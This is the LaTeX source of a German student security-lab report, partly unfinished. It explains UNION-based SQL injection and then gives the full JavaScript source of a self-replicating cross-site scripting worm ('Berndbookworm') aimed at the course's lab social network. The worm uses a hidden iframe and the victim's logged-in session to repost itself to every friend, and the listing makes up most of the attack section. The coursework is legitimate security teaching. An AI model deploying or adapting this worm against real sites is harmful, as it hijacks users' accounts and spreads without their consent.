\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{todo}
\usepackage[ngerman]{babel}
\usepackage[left=2cm]{geometry}

\usepackage{listings}
\usepackage{color}
\definecolor{lightgray}{rgb}{.9,.9,.9}
\definecolor{darkgray}{rgb}{.4,.4,.4}
\definecolor{purple}{rgb}{0.65, 0.12, 0.82}

\lstdefinelanguage{JavaScript}{
  keywords={typeof, new, true, false, catch, function, return, null, catch, switch, var, if, in, while, do, else, case, break},
  keywordstyle=\color{blue}\bfseries,
  ndkeywords={class, export, boolean, throw, implements, import, this},
  ndkeywordstyle=\color{darkgray}\bfseries,
  identifierstyle=\color{black},
  sensitive=false,
  comment=[l]{//},
  morecomment=[s]{/*}{*/},
  commentstyle=\color{purple}\ttfamily,
  stringstyle=\color{red}\ttfamily,
  morestring=[b]',
  morestring=[b]"
}

\lstset{
   language=JavaScript,
   backgroundcolor=\color{lightgray},
   extendedchars=true,
   basicstyle=\footnotesize\ttfamily,
   showstringspaces=false,
   showspaces=false,
   numbers=left,
   numberstyle=\footnotesize,
   numbersep=9pt,
   tabsize=2,
   breaklines=true,
   showtabs=false,
   captionpos=b
}


\author{Christoph Robbert 6577945, Peter Stilow 6500440}
\title{Protokoll 2}
\begin{document}
\maketitle
 
\section*{Aufgabe 1}

\subsection*{a)}
\begin{itemize}
	\item Die \textit{Union} Klausel kann zum extrahieren von Daten benutzt werden. Das ursprüngliche Anfrage wird so abgeändert das ihre Ergebnisse oder Teilergebnisse mit den Ergebnissen einer anderen (vom Angreifer bestimmten) Abfrage vereint werden. Da die Ergebnisse nur vereint werden, bleibt die Struktur der resultierenden Tabelle gleich und die Anwendung gibt die Ergebnisse des durch \textit{Union} angehängten \textit{SELECT} Statements mit aus.
	\item Wenn der Angreifer weiß, wie viele Spalten die eigentliche Anfrage hatte, kann er eine Injection zusammenstellen, die wieder genauso viele Spalten hat als Ergebnis. Dies ist wichtig, da die Daten aus den Anfragen selten direkt dem Nutzer gezeigt werden. Meistens werden sie noch durch eine Logik der Anwendung verarbeitet und aufbereitet. Wenn die Injection nun nicht die richtige Spaltenanzahl hat werden die meisten Anwendung die Darstellung abbrechen und nur einen Fehler zeigen. Wenn das Ziel des Angriffs eine Manipulation der Daten ist, kann dies ausreichen. Will der Angreifer aber Daten aus der Datenbank erhalten, will er diese auch angezeigt bekommen.
	\item 
\end{itemize}
\subsection*{b)}


\subsection*{c)}

\section*{Aufgabe 2}

\subsection*{a)}

Versand: Do.28 November 15.54 von peter\_bernd1@hell.sex nach peter\_bernd2@hell.sex
Das Listing \ref{berndbookworm} zeigt unsere Version des Berndbookworm. Dabei enthält das Listing die initiale Nachricht. Wir benutzen ein iFrame um die Website \texttt{http://berndbook.seclab.uni-paderborn.de/send.php} mit den Anmeldedaten vom aktuellen Benutzer aufzurufen. Damit dies nicht auffällt verstecken wir den iFrame per CSS Befehlen. Danach laden wir jQuery nach um uns die Arbeit mit den Website Elementen zu vereinfachen. In Zeile 8 fängt unser eigentliches Angriffskript an. Die Funktion \texttt{reproduction} führt die eigentliche Reproduktion aus. Es setzt die selbe Nachricht noch einmal zusammen. Dabei wird der aktuelle Parameter n um eins verringert. Dies sorgt dafür, dass sich das Skript nur \textit{b} mal verbreitet. Anschließend setzt das Skript diese Nachricht in das Formular auf der Unterseite \texttt{send.php} ein. Dann werden alle Checkboxen, die die Freunde repräsentiert ausgefüllt und das Formular abgeschickt. Damit die leere Nachricht den Benutzern nicht sofort auffällt haben wir einen Text ("CHello my freend!") und ein Bild in die Nachricht eingefügt.

\begin{lstlisting}[caption=Berndbookworm, label=berndbookworm]
CHello my freend!
<img src="https://alcapwn.de/logo.png" />
<iframe src="http://berndbook.seclab.uni-paderborn.de/send.php" name="send_in_a_box" style="visibility:hidden;" width="0" height="0"></iframe>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js">
</script>

<script type="text/javascript">

function reproduction(n){
	if (n >0){
		reproduction_function = reproduction.toString();
		iframe_string = "CHello my freend!<img src=\"https://alcapwn.de/logo.png\"\/><iframe src=\"http://berndbook.seclab.uni-paderborn.de/send.php\" name=\"send_in_a_box\" style=\"visibility:hidden;\" width=\"0\" height=\"0\"></iframe>";
		jquery_string = "<script type=\"text/javascript\" src=\"http://code.jquery.com/jquery-1.10.2.min.js\"><\/script>";
		script_start = "<script type=\"text/javascript\">";
		function_call = "$('body').attr('onload','reproduction(" + (n-1) + ");');"
		script_end = "<\/script>";
		msg = iframe_string + jquery_string + script_start + reproduction_function + function_call + script_end;
		$('iframe').contents().find('textarea').val(msg);
		$('iframe').contents().find('input[type=checkbox]').click();
		$("iframe").contents().find("input[type=submit]").click()
	}
}

$('body').attr('onload','reproduction(2);');
</script>
\end{lstlisting}

\subsection*{b)}



\section*{Aufgabe 3}

\end{document}